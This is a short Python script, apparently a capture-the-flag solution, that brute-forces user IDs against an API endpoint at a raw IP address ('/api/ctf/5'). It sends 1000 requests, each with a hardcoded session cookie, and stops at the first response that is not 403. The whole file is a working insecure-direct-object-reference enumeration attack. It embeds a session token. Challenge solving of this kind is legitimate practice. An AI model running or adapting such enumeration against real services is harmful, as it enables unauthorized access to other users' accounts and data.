import requests
import json

uid = 100336811

for i in range(1000):
    data = {
        "Cookie": "td_cookie=1176150464; session=eyJ1aWQiOiI0NDAwMDYifQ.X5PGwg.dX4zXjmBAdTgPRj_q_I4flVvPuA"
    }
    response = requests.get('http://45.113.201.36/api/ctf/5?uid=' + str(uid + i), headers=data)
    js = json.loads(response.content.decode('unicode_escape'))
    if js["code"] != '403':
        print(js)
        print(i)
        break
